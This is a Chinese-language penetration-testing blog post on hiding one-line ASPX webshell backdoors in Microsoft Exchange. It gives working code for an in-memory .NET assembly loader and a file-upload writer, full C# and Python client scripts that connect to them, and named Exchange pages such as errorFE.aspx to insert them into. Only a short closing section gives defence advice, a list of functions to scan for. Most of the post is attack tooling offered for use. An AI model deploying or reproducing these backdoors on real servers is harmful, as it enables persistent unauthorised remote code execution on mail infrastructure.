---
layout: post
title: 渗透基础——Exchange一句话后门的实现
---


## 0x00 前言
---

在之前的文章[《对APT34泄露工具的分析-HighShell和HyperShell》](https://3gstudent.github.io/3gstudent.github.io/%E5%AF%B9APT34%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%88%86%E6%9E%90-HighShell%E5%92%8CHyperShell/)分析了HyperShell中的ExpiredPassword.aspx，通过向Exchange登录页面下的ExpiredPassword.aspx添加代码实现后门功能。

本文将要沿着这个思路，在技术角度介绍另外两种实现方法，开源测试代码，给出防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- 两种后门代码的实现
- 通过C Sharp代码实现后门连接
- 通过Python代码实现后门连接
- 利用分析
- 防御建议

## 0x02 两种后门代码的实现
---

### 1.内存加载.net程序集

这里参考[《利用动态二进制加密实现新型一句话木马之.NET篇》](https://xz.aliyun.com/t/2744)

为了缩短代码长度，示例test1.aspx的代码如下：

```
<%@ Page Language="C#" %><%System.Reflection.Assembly.Load(Convert.FromBase64String(Request.Form["demodata"])).CreateInstance("Payload").Equals("");%>
```

代码会判断是否带有POST请求的参数`demodata`，如果存在会将POST请求中参数`demodata`的内容作base64解密，在内存加载并调用名为Payload的实例

**注：**

[sharpyshell](https://github.com/antonioCoco/SharPyShell)也使用相同的内存加载方式

我们可以通过以下方式生成Payload：

(1)新建文件demo.cs

代码如下：

```
using System;
using System.Diagnostics;
public class Payload
{
    public override bool Equals(Object obj)
    {
        Process.Start("calc.exe");
        return true;
    }
}
```

(2)编译生成dll文件

命令如下：

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library demo.cs
```

生成demo.dll后进行base64加密，作为POST请求中参数`demodata`的内容，发送至test1.aspx，即可触发后门


### 2.文件写入

为了缩短代码长度，示例test2.aspx的代码如下：

```
<%@ Page Language="C#" %><%if (Request.Files.Count!=0)Request.Files[0].SaveAs(Server.MapPath("./uploadDemo.aspx"));}%>
```

代码会判断是否有文件上传请求，如果存在会将第一个文件上传请求的内容保存在同级目录下的`uploadDemo.aspx`

参数说明：

- `Request.Files.Count`：上传文件数量
- `Server.MapPath("")` ：返回当前页面所在的物理文件路径
- `Request.Files[0].SaveAs()`：保存上传的第一个文件
- `Server.MapPath("./uploadByfile.aspx")`：返回当前页面同级路径下的`"uploadByfile.aspx"`

## 0x03 通过C Sharp代码实现后门连接
---

### 1.内存加载.net程序集

发送POST请求带参数时，ContentType需要指定为`application/x-www-form-urlencoded`

POST请求的内容需要注意转义字符的问题，例如发送的内容包含字符`=`，会被识别成用来分隔键和值的特殊字符。而我们使用base64编码时，会用到字符`=`，所以在发送POST请求时，需要将base64编码的结果再次进行URL编码，例如将字符`=`转换为`%3d`

完整代码如下：

```
using System;
using System.Text;
using System.Net;
using System.IO;
using System.Web;

namespace test
{
    public class Program
    {

        public static string HttpPostData(string url, string path)
        {
            byte[] buffer = System.IO.File.ReadAllBytes(path);
            string base64str = Convert.ToBase64String(buffer);

            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";

            string Param = "demodata=" + HttpUtility.UrlEncode(base64str);
            byte[] post=Encoding.UTF8.GetBytes(Param);
            Stream postStream = request.GetRequestStream();
            postStream.Write(post,0,post.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;    
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }
                     
        public static void Main(string[] args)
        {

            if(args.Length!=2)
            {
                Console.WriteLine("<url> <path>");
                System.Environment.Exit(0);
            }            

            try
            {
                string url = args[0];
                string path = args[1];
                Console.WriteLine("[*] Try to read: " + path);
                Console.WriteLine("[*] Try to access: " + url);

                string result = HttpPostData(url, path);
                Console.WriteLine("[*] Response: \n" + result);                                
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
        	}
        }
    }
}
```

### 2.文件写入

通过POST请求发送文件时，ContentType需要指定为`multipart/form-data`


完整代码如下：

```
using System;
using System.Text;
using System.Net;
using System.IO;

namespace test
{
    public class Program
    {
        public static string HttpUploadFile(string url, string path)
        {
            ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
            request.Method = "POST";
            request.UserAgent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";
            string boundary = DateTime.Now.Ticks.ToString("X");
            request.ContentType = "multipart/form-data;charset=utf-8;boundary=" + boundary;
            byte[] itemBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "\r\n");
            byte[] endBoundaryBytes = Encoding.UTF8.GetBytes("\r\n--" + boundary + "--\r\n");
            int pos = path.LastIndexOf("\\");
            string fileName = path.Substring(pos + 1);
   
            StringBuilder sbHeader = new StringBuilder(string.Format("Content-Disposition:form-data;name=\"file\";filename=\"{0}\"\r\nContent-Type:application/octet-stream\r\n\r\n", fileName));
            byte[] postHeaderBytes = Encoding.UTF8.GetBytes(sbHeader.ToString());

            FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read);
            byte[] bArr = new byte[fs.Length];
            fs.Read(bArr, 0, bArr.Length);
            fs.Close();

            Stream postStream = request.GetRequestStream();
            postStream.Write(itemBoundaryBytes, 0, itemBoundaryBytes.Length);
            postStream.Write(postHeaderBytes, 0, postHeaderBytes.Length);
            postStream.Write(bArr, 0, bArr.Length);
            postStream.Write(endBoundaryBytes, 0, endBoundaryBytes.Length);
            postStream.Close();

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;    
            Stream instream = response.GetResponseStream();
            StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
            string content = sr.ReadToEnd();
            return content;
        }
                       
        public static void Main(string[] args)
        {
            
           if(args.Length!=2)
            {
                Console.WriteLine("<url> <path>");
                System.Environment.Exit(0);
            }            

            try
            {
                string url = args[0];
                string path = args[1];
                Console.WriteLine("[*] Try to read: " + path);
                Console.WriteLine("[*] Try to access: " + url);
                
                string result = HttpUploadFile(url, path);
                Console.WriteLine("[*] Response: \n" + result);               
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
            }

        }

    }
}
```

## 0x04 通过Python代码实现后门连接
---

相比于C Sharp，Python的代码更加简洁

### 1.内存加载.net程序集

发送POST请求，参数为`demodata`，内容为base64编码的字符串

完整代码如下：

```
import requests
import base64
import sys
import os
import urllib3
urllib3.disable_warnings()
import urllib.parse

def post(url,path):
    with open(path, 'rb') as file_obj:
        content = file_obj.read()
    data = base64.b64encode(content).decode('utf8')  
    body = {"demodata": data}
    postData = urllib.parse.urlencode(body).encode("utf-8")
    print(postData)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx"
    } 

    response = requests.post(url, headers=headers, data=body, verify = False)
    print(response.text)
 
if __name__ == "__main__":
    if len(sys.argv)!=3:
        print('%s <url> <path>'%(sys.argv[0]))
        sys.exit(0)
    else:
        post(sys.argv[1],sys.argv[2])
```

### 2.文件写入

发送POST请求，上传文件

完整代码如下：

```
import requests
import base64
import sys
import os
import urllib3
urllib3.disable_warnings()
import urllib.parse

def post(url,path):
    with open(path, 'r') as file_obj:
        data = file_obj.read()  
    files = {'image_file':(path,data,'image/jpeg')};    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx"
    } 
    response = requests.post(url, headers=headers, files=files, verify = False)
    print(response.text)
 
if __name__ == "__main__":
    if len(sys.argv)!=3:
        print('%s <url> <path>'%(sys.argv[0]))
        sys.exit(0)
    else:
        post(sys.argv[1],sys.argv[2])
```

## 0x05 利用分析
---

无论是内存加载.net程序集还是文件写入的一句话后门，不仅可以作为独立的aspx文件存在，还可以插入到Exchange正常的页面中

例如文件位置:`%ExchangeInstallPath%FrontEnd\HttpProxy\owa\auth\errorFE.aspx`

`errorFE.aspx`为Exchange的错误页面，可以在其中插入一句话后门

访问的url为:`https://<url>/owa/auth/errorFE.aspx`

**注：**

`%ExchangeInstallPath%FrontEnd\`下的文件可通过Web直接访问

`%ExchangeInstallPath%ClientAccess\`下的文件只有经过验证的用户才能访问，也就是说，访问时需要带有合法用户的Cookie


为了便于测试，我编写了连接一句话后门的测试程序，分别用C Sharp和Python实现，代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeBackdoor.cs

https://github.com/3gstudent/Homework-of-Python/blob/master/SharpExchangeBackdoor.py

代码支持对内存加载.net程序集和文件写入后门的连接

支持登录验证，例如将后门文件保存为:`%ExchangeInstallPath%ClientAccess\ecp\Education.aspx`

访问的url为:`https://<url>/ecp/Education.aspx`

对于[SharpExchangeBackdoor.cs](https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeBackdoor.cs)，在实现登录验证的功能时，需要注意以下问题：

正常在访问`https://<url>/owa/auth.owa`时，默认会进行302跳转至`https://<url>/owa`，为了能够获得可用的cookie，这里需要禁用重定向

对于[SharpExchangeBackdoor.py](https://github.com/3gstudent/Homework-of-Python/blob/master/SharpExchangeBackdoor.py)，在实现登录验证的功能时，使用session对象可以自动处理网页重定向，获得可用的cookie

作为测试程序，SharpExchangeBackdoor的通信数据均未加密，内存加载.net程序集的功能仅做了base64编码，文件写入的功能未加密

## 0x06 防御建议
---

对于Exchange一句话后门，不仅需要判断是否有新的文件写入，还需要判断正常的页面是否被插入恶意内容。

在静态分析上面，可以查看aspx文件中是否包含以下敏感函数：

- 内存加载：Assembly.Load，Assembly.LoadFrom，Assembly.LoadFile
- 文件写入：SaveAs，Write，WriteLine，WriteAllLines
- 进程启动：Start，WinExec

## 0x07 小结
---

本文介绍了两种Exchange一句话后门(内存加载.net程序集和文件写入)，开源测试代码，分析利用思路，给出防御建议。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)







